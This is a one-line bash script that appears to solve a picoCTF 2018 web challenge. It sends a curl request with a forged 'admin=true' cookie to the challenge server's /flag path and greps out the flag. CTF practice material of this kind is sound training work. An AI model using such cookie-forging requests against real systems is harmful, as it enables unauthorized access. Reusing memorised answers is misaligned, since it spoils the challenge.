#!/bin/bash

curl -XGET --silent http://2018shell.picoctf.com:52920/flag -L -b 'admin=true' | grep -o "picoCTF{.*}"
